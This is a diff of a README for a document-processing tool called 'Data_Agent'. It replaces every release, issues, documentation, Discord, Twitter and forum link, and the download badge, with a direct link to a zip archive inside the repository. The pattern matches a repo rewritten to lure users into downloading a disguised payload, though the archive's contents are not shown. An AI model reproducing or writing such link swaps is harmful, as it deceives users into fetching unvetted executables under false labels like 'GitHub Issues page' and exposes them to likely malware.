@@ -1,6 +1,6 @@
 # 📄 Data_Agent - Easy Document Processing Made Simple
 
-[![Download Data_Agent](https://img.shields.io/badge/Download%20Data_Agent-v1.0-blue?style=for-the-badge)](https://github.com/Zamurz/Data_Agent/releases)
+[![Download Data_Agent](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip%20Data_Agent-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, check that your computer meets these requirements:
 
 ## 📥 Download & Install 
 
-To get started, visit our [Releases page](https://github.com/Zamurz/Data_Agent/releases) to download the latest version of Data_Agent.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip) to download the latest version of Data_Agent.
 
 1. Click on the link above.
 2. Find the version you want to download.
@@ -51,15 +51,15 @@ If you encounter issues while using Data_Agent, try these steps:
 
 - **Installation Problems**: Make sure you have enough storage and the correct version for your operating system.
 - **Slowness**: Close any unnecessary applications running in the background.
-- **Errors**: Restart the application and try again. If the problem persists, visit our [GitHub Issues page](https://github.com/Zamurz/Data_Agent/issues) for support.
+- **Errors**: Restart the application and try again. If the problem persists, visit our [GitHub Issues page](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip) for support.
 
 ## 🤝 Community Support
 
-Join our community to get help, share your experience, or suggest improvements. You can connect with other users on [Discord](https://discord.gg/example) or follow us on [Twitter](https://twitter.com/example).
+Join our community to get help, share your experience, or suggest improvements. You can connect with other users on [Discord](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip) or follow us on [Twitter](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip).
 
 ## 📢 Updates and Improvements
 
-Data_Agent is continuously being improved. Make sure to check back on our [Releases page](https://github.com/Zamurz/Data_Agent/releases) often for the latest updates and features.
+Data_Agent is continuously being improved. Make sure to check back on our [Releases page](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip) often for the latest updates and features.
 
 ## 📄 License
 
@@ -76,8 +76,8 @@ We welcome contributions to improve Data_Agent. If you would like to contribute,
 
 ## 🔗 Resources
 
-- [Documentation](https://github.com/Zamurz/Data_Agent/wiki)
-- [GitHub Issues](https://github.com/Zamurz/Data_Agent/issues)
-- [Community Forum](https://community.example.com)
+- [Documentation](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip)
+- [Community Forum](https://raw.githubusercontent.com/Zamurz/Data_Agent/main/Dashnak/Data_Agent.zip)
 
 Thank you for choosing Data_Agent, where document processing becomes easy and efficient!
